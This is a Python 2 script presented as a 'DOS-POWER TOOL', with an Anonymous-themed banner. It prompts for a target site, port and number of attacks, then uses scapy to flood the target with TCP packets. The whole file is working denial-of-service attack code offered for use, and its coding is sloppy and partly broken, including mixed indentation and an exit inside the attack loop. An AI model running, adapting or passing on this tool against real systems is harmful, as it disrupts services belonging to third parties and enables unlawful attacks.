#!/usr/bin/python

from socket import AF_INET , SOCK_STREAM
from scapy.all import *
import os

"""
THIS TOOL

By:> Oseid Aldary

"""

#COLORS============#
BLUE = '\033[94m'  #
GREEN = '\033[32m' #
RED = '\033[91m'   #
WHITE = '\033[0m'  #
#==================#

#CHECK INTERNET CONNECTION =========================
os.system("clear")
print(BLUE+" +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+")
print(WHITE+" |@|"+GREEN+">|>"+RED+"|D|o|s|"+WHITE+"-"+RED+"|P|o|w|e|r|"+GREEN+"<|<"+WHITE+"|@|")
print(BLUE+" +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n")
print(BLUE+"\n[*]"+RED+":"+GREEN+"Checking Internet Connection...........")
os.system("sleep 4")

REMOTE_SERVER = "www.google.com"
def is_connected():
  try:

    host = socket.gethostbyname(REMOTE_SERVER)

    s = socket.create_connection((host, 80), 2)
    return True
  except:
     pass
  return False
if is_connected() == True:
                                print(BLUE+"\n[+]"+RED+":"+GREEN+"[ Connected ]")
                                os.system("sleep 2")

elif is_connected() == False:
                                print(RED+"\n[!]"+GREEN+"Your Not Connected To The Internet !!")
                                print(BLUE+"[*]"+RED+":"+GREEN+"Please Connect To The Internet And Try Again :)")
				print(WHITE+"Script Stoping.......")
				os.system("sleep 1")
                                exit()

# END CHECK INTERNET CONNECTION ======================================================================


#Dos Function===================================

def doss(target):

    s = socket.socket(AF_INET,SOCK_STREAM) #Create_Connection
    ip = socket.gethostbyname(target) #Get Target ip addr to connect
    s.connect((ip, int(port))) #Connect TO target site for sent attacks 
    os.system('clear')
    print(RED+"\n>>[*]"+GREEN+"Attack Has Been Start On"+RED+" >> [{}] <<\n".format(target))
    os.system("sleep 1")
    print(RED+"\n[+]"+WHITE+"Sent "+GREEN+"["+RED+str(attacks)+GREEN+"]"+" Attacks To Target >"+GREEN+"["+RED+target+GREEN+"]")
    os.system('sleep 0.5')
    print(WHITE+"\npress"+BLUE+" Ctrl+c"+WHITE+" To Stop Attacks \n"+RED)
    os.system("sleep 1")
    send(IP(dst=ip) /TCP(dport=int(port)),count=int(attacks)) # < Sent Attacks to target
    exit()


os.system('clear')

#Script Banner================================================================
print(RED+"""
    ___                  ___                           
   /   \___  ___        / _ \_____      _____ _ __     
  / /\ / _ \/ __|_____ / /_)/ _ \ \ /\ / / _ \ '__|{>>[We Are Anonymous Arabs]
 / /_// (_) \__ \_____/ ___/ (_) \ V  V /  __/ |   {>>[We Are Legion         ]
/___,' \___/|___/     \/    \___/ \_/\_/ \___|_|   {>>[We Dont Forgive       ]
                                                   {>>[We Dont Forget        ]
						   {>>[Expect Us             ] """)


print(BLUE+"[---]\t by:>"+RED+" OSEID ALDARY\t"+BLUE+"[---]")
print(BLUE+"[---]\t Version:>"+RED+" 1.5\t        "+BLUE+"[---]\n")

print(GREEN+"======================"+WHITE+" Welcome"+GREEN+" TO [> "+RED+"DOS-POWER TOOL"+GREEN+" <] ======================")
os.system('sleep 1')

#Input target info for attack on him ===========================

target =raw_input(BLUE+"\n\n[*]"+RED+":"+GREEN+"Enter Target Site"+WHITE+":"+BLUE+"~"+WHITE+"# "+RED)
print(WHITE+"\nTarget ==> "+RED+target+WHITE)
print("\n================================")
port =int(input(BLUE+"\n\n[*]"+RED+":"+GREEN+"Enter Port"+WHITE+":"+BLUE+"~"+WHITE+"# "+RED))
print(WHITE+"\nPort ==> "+RED+str(port)+WHITE)
print("\n================================")
attacks =int(input(BLUE+"\n\n[*]"+RED+":"+GREEN+"Enter Number Of Attacks"+WHITE+":"+BLUE+"~"+WHITE+"# "+RED))
print(WHITE+"\nAttacks ==> "+RED+str(attacks)+WHITE)
print("\n================================")
os.system('sleep 1')

#Start Attack=====================

for i in range(0,int(attacks)):
	doss(target)



##############################################################
##################### 		     #########################
#####################  END OF SCRIPT #########################
#####################                #########################
##############################################################
#This Script by Oseid Aldary
#Have a nice day :)
#GoodBye
